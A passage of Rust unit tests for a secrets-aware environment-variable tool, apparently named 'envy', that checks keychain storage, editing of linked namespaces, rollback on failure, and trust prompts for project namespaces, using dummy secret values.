        assert_eq!(snap(&store), vec![entry("work", "TOKEN", "s3cret")]);
        assert_eq!(file_names(&dir), ["work.toml"]);
    }

    #[test]
    fn edit_plain_to_secret_converts_and_prompts_hidden_value() {
        let (dir, cfg) = config_with(&[("work", "[vars]\nA = \"x\"\nB = \"y\"\n")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_secret("sb");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let seen = RefCell::new(Seen::default());
        edit(
            &ctx,
            "work",
            &editor(&seen, |t| t.replace("\"y\"", "\"@keychain\"")),
        )
        .unwrap();
        assert_eq!(read(&dir, "work"), "[vars]\nA = \"x\"\nB = \"@keychain\"\n");
        assert_eq!(
            prompt.asked(),
            vec![Asked::Secret("Secret value for B in work".into())]
        );
        assert_eq!(snap(&store), vec![entry("work", "B", "sb")]);
    }

    #[test]
    fn edit_plain_change_updates_file_without_prompts() {
        let before = "# top\n[vars]\n# about A\nA = \"1\" # inline\nT = \"@keychain\"\n";
        let (dir, cfg) = config_with(&[("work", before)]);
        let store = MemoryStore::default();
        store.set("work", "T", &Secret::new("t".into())).unwrap();
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let seen = RefCell::new(Seen::default());
        let after = "# top\n[vars]\n# about A\nA = \"2\"   # inline, edited\nT = \"@keychain\"\nB = 'lit'\n";
        assert!(edit(&ctx, "work", &editor(&seen, |_| after.to_string())).unwrap());
        assert_private_copy_removed(&seen, before);
        assert_eq!(read(&dir, "work"), after);
        assert!(prompt.asked().is_empty());
        assert_eq!(snap(&store), vec![entry("work", "T", "t")]);
    }

    #[test]
    fn edit_secret_to_plain_deletes_keychain_item_after_confirm() {
        let (dir, cfg) = config_with(&[(
            "work",
            "[vars]\nTOKEN = \"@keychain\"\nGONE = \"@keychain\"\nKEEP = \"@keychain\"\n",
        )]);
        let store = MemoryStore::default();
        for (name, value) in [("TOKEN", "zq-1"), ("GONE", "zq-2"), ("KEEP", "zq-3")] {
            store.set("work", name, &Secret::new(value.into())).unwrap();
        }
        store
            .set("other", "TOKEN", &Secret::new("o".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new().with_confirm(true);
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let seen = RefCell::new(Seen::default());
        edit(
            &ctx,
            "work",
            &editor(&seen, |_| {
                "[vars]\nTOKEN = \"now-visible\"\nKEEP = \"@keychain\"\n".into()
            }),
        )
        .unwrap();
        assert_eq!(
            read(&dir, "work"),
            "[vars]\nTOKEN = \"now-visible\"\nKEEP = \"@keychain\"\n"
        );
        assert_eq!(
            snap(&store),
            vec![entry("other", "TOKEN", "o"), entry("work", "KEEP", "zq-3")]
        );
        let asked = prompt.asked();
        assert_eq!(asked.len(), 1, "{asked:?}");
        let Asked::Confirm(q) = &asked[0] else {
            panic!("{asked:?}")
        };
        assert_eq!(
            q,
            "Delete the Keychain items for TOKEN, GONE from \"work\" (no longer secrets there)?"
        );
    }

    #[test]
    fn edit_declining_keychain_cleanup_saves_the_file_and_keeps_the_items() {
        let (dir, cfg) = config_with(&[("work", "[vars]\nTOKEN = \"@keychain\"\n")]);
        let store = MemoryStore::default();
        store
            .set("work", "TOKEN", &Secret::new("zq-1".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new().with_confirm(false);
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let seen = RefCell::new(Seen::default());
        edit(&ctx, "work", &editor(&seen, |_| "[vars]\n".into())).unwrap();
        assert_eq!(read(&dir, "work"), "[vars]\n");
        assert_eq!(snap(&store), vec![entry("work", "TOKEN", "zq-1")]);
        assert_eq!(prompt.asked().len(), 1);
    }

    const LINKED_A: &str = "link = \"aws\"\n\n[vars]\nREGION = \"eu\"\nTOKEN = \"@keychain\"\n";
    const LINKED_B: &str = "link = \"aws\"\n\n[vars]\nREGION = \"us\"\nTOKEN = \"@keychain\"\n";
    const LINKED_C: &str = "link = \"aws\"\n\n[vars]\nTOKEN = \"@keychain\"\nREGION = \"ap\"\n";

    #[test]
    fn edit_removed_secret_offers_cleanup_and_propagates_to_group() {
        let (dir, cfg) = config_with(&[
            ("a", LINKED_A),
            ("b", LINKED_B),
            ("c", LINKED_C),
            ("other", "[vars]\nTOKEN = \"@keychain\"\n"),
        ]);
        let store = MemoryStore::default();
        for ns in ["a", "b", "c", "other"] {
            store
                .set(ns, "TOKEN", &Secret::new(format!("zq-{ns}")))
                .unwrap();
        }
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_confirm(true);
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let seen = RefCell::new(Seen::default());
        edit(
            &ctx,
            "a",
            &editor(&seen, |t| t.replace("TOKEN = \"@keychain\"\n", "")),
        )
        .unwrap();
        assert_private_copy_removed(&seen, LINKED_A);
        let asked = prompt.asked();
        assert_eq!(
            asked,
            vec![
                Asked::Confirm(
                    "Delete the Keychain items for TOKEN from \"a\" (no longer secrets there)?"
                        .into()
                ),
                Asked::Confirm(
                    "Link group \"aws\" must match \"a\". This will change:\n  b: remove TOKEN (deletes Keychain items: TOKEN)\n  c: remove TOKEN (deletes Keychain items: TOKEN)\nContinue?"
                        .into()
                ),
            ]
        );
        assert!(!format!("{asked:?}").contains("zq-"));
        assert_eq!(
            read(&dir, "a"),
            "link = \"aws\"\n\n[vars]\nREGION = \"eu\"\n"
        );
        assert_eq!(
            read(&dir, "b"),
            "link = \"aws\"\n\n[vars]\nREGION = \"us\"\n"
        );
        assert_eq!(
            read(&dir, "c"),
            "link = \"aws\"\n\n[vars]\nREGION = \"ap\"\n"
        );
        assert_eq!(snap(&store), vec![entry("other", "TOKEN", "zq-other")]);
    }

    #[test]
    fn edit_new_name_in_linked_namespace_prompts_in_every_member_before_writing() {
        let (dir, cfg) = config_with(&[("a", LINKED_A), ("b", LINKED_B)]);
        let store = MemoryStore::default();
        let edited = |t: &str| format!("{t}KEY = \"@keychain\"\nDB_USER = \"alice\"\n");

        // No answer for b's DB_USER: nothing at all is written.
        let short = ScriptedPrompter::new().with_secret("ka").with_secret("kb");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &short,
        };
        let seen = RefCell::new(Seen::default());
        assert!(edit(&ctx, "a", &editor(&seen, edited)).is_err());
        assert_eq!(short.asked().len(), 3);
        assert_eq!(
            (read(&dir, "a"), read(&dir, "b")),
            (LINKED_A.into(), LINKED_B.into())
        );
        assert!(snap(&store).is_empty());

        let prompt = ScriptedPrompter::new()
            .with_secret("ka")
            .with_secret("kb")
            .with_plain("user-b");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        edit(&ctx, "a", &editor(&seen, edited)).unwrap();
        assert_eq!(
            prompt.asked(),
            vec![
                Asked::Secret("Secret value for KEY in a".into()),
                Asked::Secret("Secret value for KEY in b".into()),
                Asked::Plain {
                    label: "Value for DB_USER in b".into(),
                    default: None
                },
            ]
        );
        assert_eq!(
            snap(&store),
            vec![entry("a", "KEY", "ka"), entry("b", "KEY", "kb")]
        );
        assert_eq!(
            read(&dir, "a"),
            format!("{LINKED_A}KEY = \"@keychain\"\nDB_USER = \"alice\"\n")
        );
        assert_eq!(
            read(&dir, "b"),
            format!("{LINKED_B}KEY = \"@keychain\"\nDB_USER = \"user-b\"\n")
        );
    }

    #[test]
    fn edit_invalid_toml_is_rejected_and_original_untouched() {
        let before = "[vars]\nA = \"1\"\nT = \"@keychain\"\n";
        let (dir, cfg) = config_with(&[("work", before)]);
        let store = MemoryStore::default();
        store.set("work", "T", &Secret::new("t".into())).unwrap();
        let prompt = ScriptedPrompter::new().with_confirm(true);
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let seen = RefCell::new(Seen::default());
        let err = edit(
            &ctx,
            "work",
            &editor(&seen, |_| "[vars\nA = \"zq-typed\" oops\n".into()),
        )
        .unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("invalid TOML") && msg.contains("nothing was changed"),
            "{msg}"
        );
        assert!(!msg.contains("zq-typed"), "{msg}");
        assert_private_copy_removed(&seen, before);
        assert_eq!(read(&dir, "work"), before);
        assert_eq!(snap(&store), vec![entry("work", "T", "t")]);
        assert!(prompt.asked().is_empty());
    }

    #[test]
    fn edit_rejects_bad_variable_names_and_values() {
        let before = "[vars]\nA = \"1\"\n";
        for bad in [
            "[vars]\nA = \"1\"\n\"BAD-NAME\" = \"zq-v\"\n",
            "[vars]\nENVY_ACTIVE = \"zq-v\"\n",
            "[vars]\nA = 5\n",
            "[vars]\nA = \"zq-v\"\n[vars.nested]\nB = \"1\"\n",
        ] {
            let (dir, cfg) = config_with(&[("work", before)]);
            let store = MemoryStore::default();
            let prompt = ScriptedPrompter::new();
            let ctx = Ctx {
                cfg: &cfg,
                store: &store,
                prompt: &prompt,
            };
            let seen = RefCell::new(Seen::default());
            let err = edit(&ctx, "work", &editor(&seen, |_| bad.to_string())).unwrap_err();
            let msg = format!("{err:#}");
            assert!(msg.contains("nothing was changed"), "{bad:?}: {msg}");
            assert!(!msg.contains("zq-v"), "{msg}");
            assert_eq!(read(&dir, "work"), before);
            assert!(snap(&store).is_empty());
        }
    }

    #[test]
    fn edit_rejects_plain_marker_literal() {
        // In the editor the marker always means "secret", however it is
        // spelled: it is never stored as a plain value. Without a hidden
        // value to go with it, the edit is rejected.
        for spelled in [
            "'@keychain'",
            "\"\\u0040keychain\"",
            "\"\"\"@keychain\"\"\"",
        ] {
            let before = "[vars]\nA = \"x\"\n";
            let (dir, cfg) = config_with(&[("work", before)]);
            let store = MemoryStore::default();
            let prompt = ScriptedPrompter::new().with_secret("");
            let ctx = Ctx {
                cfg: &cfg,
                store: &store,
                prompt: &prompt,
            };
            let seen = RefCell::new(Seen::default());
            let after = format!("[vars]\nA = {spelled}\n");
            let err = edit(&ctx, "work", &editor(&seen, |_| after.clone())).unwrap_err();
            let msg = format!("{err:#}");
            assert!(msg.contains("nothing was changed"), "{msg}");
            assert_eq!(
                prompt.asked(),
                vec![Asked::Secret("Secret value for A in work".into())]
            );
            assert_eq!(read(&dir, "work"), before);
            assert!(snap(&store).is_empty());
            assert_eq!(
                cfg.load("work").unwrap().get("A"),
                Some(Value::Plain("x".into()))
            );
        }
    }

    #[test]
    fn edit_rejects_link_label_change() {
        let linked = "link = \"aws\"\n[vars]\nA = \"1\"\n";
        let unlinked = "[vars]\nA = \"1\"\n";
        for (before, after) in [
            (linked, "link = \"gcp\"\n[vars]\nA = \"1\"\n"),
            (linked, unlinked),
            (unlinked, linked),
        ] {
            let (dir, cfg) = config_with(&[("work", before)]);
            let store = MemoryStore::default();
            let prompt = ScriptedPrompter::new();
            let ctx = Ctx {
                cfg: &cfg,
                store: &store,
                prompt: &prompt,
            };
            let seen = RefCell::new(Seen::default());
            let err = edit(&ctx, "work", &editor(&seen, |_| after.to_string()))
                .unwrap_err()
                .to_string();
            assert!(err.contains("--link") && err.contains("--unlink"), "{err}");
            assert!(err.contains("nothing was changed"), "{err}");
            assert_eq!(read(&dir, "work"), before);
            assert!(prompt.asked().is_empty());
        }
        // A bad label is rejected by the parser.
        let (dir, cfg) = config_with(&[("work", linked)]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let seen = RefCell::new(Seen::default());
        let err = edit(
            &ctx,
            "work",
            &editor(&seen, |_| "link = \"../x\"\n[vars]\nA = \"1\"\n".into()),
        )
        .unwrap_err();
        assert!(format!("{err:#}").contains("link"), "{err:#}");
        assert_eq!(read(&dir, "work"), linked);
    }

    #[test]
    fn edit_with_no_changes_repairs_drifted_group_by_conforming_others() {
        // `a` was hand-edited: it gained NEW and lost TOKEN. Editing it
        // without changes makes it the truth for the rest of the group.
        let a = "link = \"aws\"\n\n[vars]\nREGION = \"eu\"\nNEW = \"n\"\n";
        let (dir, cfg) = config_with(&[("a", a), ("b", LINKED_B), ("c", LINKED_C)]);
        let store = MemoryStore::default();
        store
            .set("b", "TOKEN", &Secret::new("zq-b".into()))
            .unwrap();
        store
            .set("c", "TOKEN", &Secret::new("zq-c".into()))
            .unwrap();
        assert!(link::ensure_aligned(&cfg, &cfg.load("a").unwrap()).is_err());
        let a_inode = std::fs::metadata(dir.path().join("a.toml")).unwrap().ino();
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_plain("nb")
            .with_plain("nc");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let seen = RefCell::new(Seen::default());
        assert!(edit(&ctx, "a", &editor(&seen, str::to_string)).unwrap());
        assert_eq!(
            prompt.asked(),
            vec![
                Asked::Confirm(
                    "Link group \"aws\" must match \"a\". This will change:\n  b: remove TOKEN (deletes Keychain items: TOKEN)\n  c: remove TOKEN (deletes Keychain items: TOKEN)\nContinue?"
                        .into()
                ),
                Asked::Plain {
                    label: "Value for NEW in b".into(),
                    default: None
                },
                Asked::Plain {
                    label: "Value for NEW in c".into(),
                    default: None
                },
            ]
        );
        // `a` itself was not rewritten.
        assert_eq!(read(&dir, "a"), a);
        assert_eq!(
            std::fs::metadata(dir.path().join("a.toml")).unwrap().ino(),
            a_inode
        );
        assert_eq!(
            read(&dir, "b"),
            "link = \"aws\"\n\n[vars]\nREGION = \"us\"\nNEW = \"nb\"\n"
        );
        assert_eq!(
            read(&dir, "c"),
            "link = \"aws\"\n\n[vars]\nREGION = \"ap\"\nNEW = \"nc\"\n"
        );
        assert!(snap(&store).is_empty());
        link::ensure_aligned(&cfg, &cfg.load("b").unwrap()).unwrap();

        // Declining the group's confirmation changes nothing anywhere.
        let (dir, cfg) = config_with(&[("a", a), ("b", LINKED_B)]);
        let store = MemoryStore::default();
        store
            .set("b", "TOKEN", &Secret::new("zq-b".into()))
            .unwrap();
        let prompt = ScriptedPrompter::new().with_confirm(false);
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        assert!(edit(&ctx, "a", &editor(&seen, str::to_string)).is_err());
        assert_eq!(
            (read(&dir, "a"), read(&dir, "b")),
            (a.into(), LINKED_B.into())
        );
        assert_eq!(snap(&store), vec![entry("b", "TOKEN", "zq-b")]);
    }

    #[test]
    fn edit_conforms_an_inconsistent_group_to_the_edited_member() {
        // b and c disagree with each other and with a. Unlike --link, edit
        // (like --secret and --plain) takes the edited file as the truth and conforms each
        // other member to it, so it repairs an inconsistent group too.
        let a = "link = \"aws\"\n[vars]\nREGION = \"eu\"\n";
        let b = "link = \"aws\"\n[vars]\nREGION = \"us\"\nX = \"1\"\n";
        let c = "link = \"aws\"\n[vars]\nY = \"2\"\n";
        let (dir, cfg) = config_with(&[("a", a), ("b", b), ("c", c)]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new().with_confirm(true).with_plain("ap");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let seen = RefCell::new(Seen::default());
        assert!(edit(&ctx, "a", &editor(&seen, str::to_string)).unwrap());
        let Asked::Confirm(q) = &prompt.asked()[0] else {
            panic!()
        };
        assert!(
            q.contains("b: remove X") && q.contains("c: remove Y"),
            "{q}"
        );
        assert_eq!(read(&dir, "a"), a);
        assert_eq!(read(&dir, "b"), "link = \"aws\"\n[vars]\nREGION = \"us\"\n");
        assert_eq!(read(&dir, "c"), "link = \"aws\"\n[vars]\nREGION = \"ap\"\n");
        assert!(snap(&store).is_empty());
    }

    #[test]
    fn edit_with_no_changes_on_unlinked_namespace_writes_and_asks_nothing() {
        let before = "# c\n[vars]\nA = \"1\"\nT = \"@keychain\"\n";
        let (dir, cfg) = config_with(&[("work", before), ("x", "link = \"g\"\n")]);
        let inode = std::fs::metadata(dir.path().join("work.toml"))
            .unwrap()
            .ino();
        let store = MemoryStore::default();
        store.set("work", "T", &Secret::new("t".into())).unwrap();
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let seen = RefCell::new(Seen::default());
        assert!(!edit(&ctx, "work", &editor(&seen, str::to_string)).unwrap());
        assert_private_copy_removed(&seen, before);
        assert!(prompt.asked().is_empty());
        assert_eq!(read(&dir, "work"), before);
        assert_eq!(
            std::fs::metadata(dir.path().join("work.toml"))
                .unwrap()
                .ino(),
            inode
        );
        assert_eq!(snap(&store), vec![entry("work", "T", "t")]);
    }

    #[test]
    fn edit_editor_failure_changes_nothing_and_removes_the_copy() {
        let before = "[vars]\nA = \"1\"\n";
        let (dir, cfg) = config_with(&[("work", before)]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let copy: RefCell<Option<PathBuf>> = RefCell::new(None);
        let err = edit(&ctx, "work", &|path: &Path| {
            std::fs::write(path, "[vars]\nA = \"2\"\n")?;
            *copy.borrow_mut() = Some(path.to_path_buf());
            bail!("the editor exited with status 1")
        })
        .unwrap_err();
        let msg = format!("{err:#}");
        assert!(
            msg.contains("status 1") && msg.contains("nothing was changed"),
            "{msg}"
        );
        assert_eq!(read(&dir, "work"), before);
        let copy = copy.borrow().clone().unwrap();
        assert!(!copy.parent().unwrap().exists());
        assert_eq!(file_names(&dir), ["work.toml"]);
    }

    #[test]
    fn edit_removes_the_copy_even_if_the_editor_panics() {
        let (_dir, cfg) = config_with(&[("work", "")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let copy: RefCell<Option<PathBuf>> = RefCell::new(None);
        let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
            edit(&ctx, "work", &|path: &Path| {
                *copy.borrow_mut() = Some(path.to_path_buf());
                panic!("editor blew up")
            })
        }));
        assert!(result.is_err());
        assert!(!copy.borrow().clone().unwrap().parent().unwrap().exists());
    }

    #[test]
    fn edit_refuses_unknown_and_unparseable_namespaces_without_running_the_editor() {
        let (dir, cfg) = config_with(&[("broken", "[vars\nA = \"zq-v\"\n")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let msg = format!("{:#}", edit(&ctx, "nope", &never_runs).unwrap_err());
        assert!(msg.contains("nope") && msg.contains("--new"), "{msg}");
        let msg = format!("{:#}", edit(&ctx, "broken", &never_runs).unwrap_err());
        let path = dir.path().join("broken.toml");
        assert!(
            msg.contains(&path.display().to_string()) && msg.contains("invalid TOML"),
            "{msg}"
        );
        assert!(!msg.contains("zq-v"), "{msg}");
        assert!(edit(&ctx, "../x", &never_runs).is_err());
        assert_eq!(read(&dir, "broken"), "[vars\nA = \"zq-v\"\n");
    }

    #[test]
    fn edit_refuses_a_linked_namespace_whose_group_cannot_be_read_before_editing() {
        let (_dir, cfg) = config_with(&[("a", LINKED_A), ("bad", "[vars\n")]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let msg = format!("{:#}", edit(&ctx, "a", &never_runs).unwrap_err());
        assert!(msg.contains("\"bad\""), "{msg}");
    }

    #[test]
    fn edit_secret_prompt_failure_writes_nothing() {
        let before = "[vars]\nA = \"1\"\nOLD = \"@keychain\"\n";
        let (dir, cfg) = config_with(&[("work", before)]);
        let store = MemoryStore::default();
        store.set("work", "OLD", &Secret::new("o".into())).unwrap();
        let prompt = ScriptedPrompter::new().with_confirm(true).with_secret("");
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let seen = RefCell::new(Seen::default());
        assert!(
            edit(
                &ctx,
                "work",
                &editor(&seen, |_| "[vars]\nA = \"1\"\nNEW = \"@keychain\"\n".into())
            )
            .is_err()
        );
        assert_eq!(read(&dir, "work"), before);
        assert_eq!(snap(&store), vec![entry("work", "OLD", "o")]);
    }

    #[test]
    fn edit_does_not_overwrite_a_file_changed_while_the_editor_was_open() {
        let before = "[vars]\nA = \"1\"\n";
        let (dir, cfg) = config_with(&[("work", before)]);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let original = dir.path().join("work.toml");
        let err = edit(&ctx, "work", &|path: &Path| {
            std::fs::write(&original, "[vars]\nTHEIRS = \"1\"\n")?;
            std::fs::write(path, "[vars]\nA = \"2\"\n")?;
            Ok(())
        })
        .unwrap_err()
        .to_string();
        assert!(err.contains("changed while"), "{err}");
        assert_eq!(read(&dir, "work"), "[vars]\nTHEIRS = \"1\"\n");
    }

    fn project_cfg(base: &std::path::Path, identity: &str) -> Config {
        Config::project(
            base.join(".envy"),
            base.to_path_buf(),
            identity.to_string(),
            base.join("user"),
        )
    }

    fn secret_change(cfg: &Config, value: &str) -> Change {
        let mut file = NamespaceFile::empty("dev").unwrap();
        file.set_var("TOKEN", Value::Secret).unwrap();
        let before = cfg.load("dev").ok();
        Change {
            file,
            before,
            secrets: vec![("TOKEN".into(), Secret::new(value.into()))],
            delete: Vec::new(),
        }
    }

    #[test]
    fn apply_with_a_project_config_uses_the_project_key() {
        let dir = tempfile::tempdir().unwrap();
        let cfg = project_cfg(dir.path(), "acme/api");
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        apply(&ctx, vec![secret_change(&cfg, "v1")]).unwrap();
        assert_eq!(
            store.snapshot(),
            vec![entry("project/acme/api/dev", "TOKEN", "v1")]
        );
        // Dropping the secret deletes the project item, not a bare one.
        let mut change = secret_change(&cfg, "v1");
        change.secrets.clear();
        change.delete = vec!["TOKEN".into()];
        apply(&ctx, vec![change]).unwrap();
        assert!(store.snapshot().is_empty());
    }

    #[test]
    fn two_projects_with_the_same_namespace_do_not_collide() {
        let dir = tempfile::tempdir().unwrap();
        let a = project_cfg(&dir.path().join("a"), "acme/api");
        let b = project_cfg(&dir.path().join("b"), "acme/web");
        let user = Config::new(dir.path().join("user-cfg"));
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new();
        for (cfg, value) in [(&a, "va"), (&b, "vb"), (&user, "vu")] {
            let ctx = Ctx {
                cfg,
                store: &store,
                prompt: &prompt,
            };
            apply(&ctx, vec![secret_change(cfg, value)]).unwrap();
        }
        assert_eq!(
            store.snapshot(),
            vec![
                entry("dev", "TOKEN", "vu"),
                entry("project/acme/api/dev", "TOKEN", "va"),
                entry("project/acme/web/dev", "TOKEN", "vb"),
            ]
        );
        // Project namespaces are confirmed on first load; the user's is not.
        let render = |cfg: &Config| {
            let answers = if cfg.is_project() {
                ScriptedPrompter::new().with_confirm(true)
            } else {
                ScriptedPrompter::new()
            };
            let out = activate_here(
                &ctx_for(cfg, &store, &answers),
                "dev",
                &ActiveState::default(),
            );
            assert_eq!(answers.remaining(), 0);
            out.unwrap()
        };
        assert!(render(&a).ends_with("export TOKEN='va'\n"));
        assert!(render(&b).ends_with("export TOKEN='vb'\n"));
        assert!(render(&user).ends_with("export TOKEN='vu'\n"));

        // Removing one (file and items) leaves the others untouched.
        let yes = ScriptedPrompter::new()
            .with_confirm(true)
            .with_confirm(true);
        remove(
            &Ctx {
                cfg: &a,
                store: &store,
                prompt: &yes,
            },
            "dev",
        )
        .unwrap();
        assert_eq!(yes.remaining(), 0);
        assert_eq!(
            store.snapshot(),
            vec![
                entry("dev", "TOKEN", "vu"),
                entry("project/acme/web/dev", "TOKEN", "vb"),
            ]
        );
        assert!(!a.exists("dev").unwrap());
    }

    fn two_secret_change(cfg: &Config) -> Change {
        let mut file = NamespaceFile::empty("dev").unwrap();
        file.set_var("A", Value::Secret).unwrap();
        file.set_var("B", Value::Secret).unwrap();
        Change {
            file,
            before: cfg.load("dev").ok(),
            secrets: vec![
                ("A".into(), Secret::new("new-a".into())),
                ("B".into(), Secret::new("new-b".into())),
            ],
            delete: Vec::new(),
        }
    }

    #[test]
    fn project_keychain_failure_rolls_back_under_the_project_key() {
        let dir = tempfile::tempdir().unwrap();
        let cfg = project_cfg(dir.path(), "acme/api");
        let store = FailingSet {
            inner: MemoryStore::default(),
            fail_on: "B",
        };
        store
            .inner
            .set("dev", "A", &Secret::new("user-a".into()))
            .unwrap();
        store
            .inner
            .set("project/acme/api/dev", "A", &Secret::new("old-a".into()))
            .unwrap();
        let before = snap(&store.inner);
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        // dev (A) is written first, then web (B) fails: dev must be rolled
        // back by `rollback_all` under its project key.
        let mut web = NamespaceFile::empty("web").unwrap();
        web.set_var("B", Value::Secret).unwrap();
        let web = Change {
            file: web,
            before: None,
            secrets: vec![("B".into(), Secret::new("new-b".into()))],
            delete: Vec::new(),
        };
        let mut dev = two_secret_change(&cfg);
        dev.secrets.truncate(1);
        assert!(apply(&ctx, vec![dev, web]).is_err());
        assert_eq!(
            before,
            vec![
                entry("dev", "A", "user-a"),
                entry("project/acme/api/dev", "A", "old-a"),
            ]
        );
        assert_eq!(snap(&store.inner), before);
        assert!(!cfg.exists("dev").unwrap() && !cfg.exists("web").unwrap());
    }

    #[test]
    fn project_file_save_failure_rolls_back_under_the_project_key() {
        let dir = tempfile::tempdir().unwrap();
        let cfg = project_cfg(dir.path(), "acme/api");
        let text = "[vars]\nA = \"@keychain\"\n";
        std::fs::create_dir_all(cfg.dir()).unwrap();
        std::fs::write(cfg.dir().join("dev.toml"), text).unwrap();
        let store = SquatOnSet {
            inner: MemoryStore::default(),
            path: cfg.dir().join("dev.toml"),
            kept: Default::default(),
        };
        store
            .inner
            .set("dev", "A", &Secret::new("user-a".into()))
            .unwrap();
        store
            .inner
            .set("project/acme/api/dev", "A", &Secret::new("old-a".into()))
            .unwrap();
        let before = snap(&store.inner);
        let prompt = ScriptedPrompter::new();
        let ctx = Ctx {
            cfg: &cfg,
            store: &store,
            prompt: &prompt,
        };
        let err = apply(&ctx, vec![two_secret_change(&cfg)]).unwrap_err();
        assert!(
            format!("{err:#}").contains("cannot write namespace \"dev\""),
            "{err:#}"
        );
        assert!(cfg.dir().join("dev.toml").is_dir());
        assert_eq!(store.kept.borrow().as_deref(), Some(text));
        assert_eq!(snap(&store.inner), before);
    }

    // ---- activate: trust and missing secrets ----

    const PROJ: &str = "[vars]\nREGION = \"eu\"\nTOKEN = \"@keychain\"\nAPI_KEY = \"@keychain\"\n";
    const PKEY: &str = "project/acme/api/dev";
    const CHANGED_NOTE: &str =
        "Note: this namespace file has changed since you last trusted it.\n\n";

    /// A project checkout at `base/<checkout>` holding `.envy/dev.toml`, whose
    /// trust records live in the shared `base/user`.
    fn checkout(base: &Path, checkout: &str, text: &str) -> Config {
        let root = base.join(checkout);
        std::fs::create_dir_all(root.join(".envy")).unwrap();
        std::fs::write(root.join(".envy/dev.toml"), text).unwrap();
        Config::project(
            root.join(".envy"),
            root,
            "acme/api".into(),
            base.join("user"),
        )
    }

    fn trusted(cfg: &Config, text: &str) -> bool {
        crate::trust::TrustStore::new(cfg.user_dir())
            .is_trusted(cfg.root().unwrap(), "dev", text)
            .unwrap()
    }

    fn project_label(name: &str) -> String {
        secret_label(name, "dev (project acme/api)")
    }

    /// A prompter on a machine with no terminal: every prompt fails.
    struct NoTerminal;

    impl Prompter for NoTerminal {
        fn secret(&self, _: &str) -> Result<Secret> {
            bail!("no terminal available to prompt on (cannot open /dev/tty)")
        }
        fn plain(&self, _: &str, _: Option<&str>) -> Result<String> {
            bail!("no terminal available to prompt on (cannot open /dev/tty)")
        }
        fn confirm(&self, _: &str) -> Result<bool> {
            bail!("no terminal available to prompt on (cannot open /dev/tty)")
        }
    }

    #[test]
    fn untrusted_project_namespace_is_confirmed_then_loaded() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
        let store = MemoryStore::default();
        let prompt = ScriptedPrompter::new()
            .with_confirm(true)
            .with_secret("tok-1")
            .with_secret("key-1");
        let out = activate_here(
            &ctx_for(&cfg, &store, &prompt),
            "dev",
            &ActiveState::default(),
        )
        .unwrap();
        assert_eq!(
            out,
            format!(
                "export ENVY_ACTIVE='dev'\nexport ENVY_STACK='dev\u{1f}{}\u{1f}REGION TOKEN API_KEY'\nexport ENVY_VARS='REGION TOKEN API_KEY'\nunset ENVY_SOURCE\n\
                 export REGION='eu'\nexport TOKEN='tok-1'\nexport API_KEY='key-1'\n",
                encode_path(cfg.dir())
            )
        );
        assert_eq!(
            snap(&store),
            vec![
                entry(PKEY, "API_KEY", "key-1"),
                entry(PKEY, "TOKEN", "tok-1")
            ]
        );
        assert!(trusted(&cfg, PROJ));
        let asked = prompt.asked();
        assert_eq!(asked.len(), 3);
        assert!(matches!(&asked[0], Asked::Confirm(text) if text.contains("acme/api")));
        // Labels name the variable, the namespace and the project.
        assert_eq!(
            asked[1..],
            [
                Asked::Secret(project_label("TOKEN")),
                Asked::Secret(project_label("API_KEY")),
            ]
        );
        // Trusted and complete: the second load asks nothing.
        let quiet = ScriptedPrompter::new();
        let again = activate_here(
            &ctx_for(&cfg, &store, &quiet),
            "dev",
            &ActiveState::default(),
        )
        .unwrap();
        assert_eq!(again, out);
        assert!(quiet.asked().is_empty());
    }

    #[test]
    fn confirmation_comes_before_any_secret_prompt() {
        let base = tempfile::tempdir().unwrap();
        let cfg = checkout(base.path(), "a", PROJ);
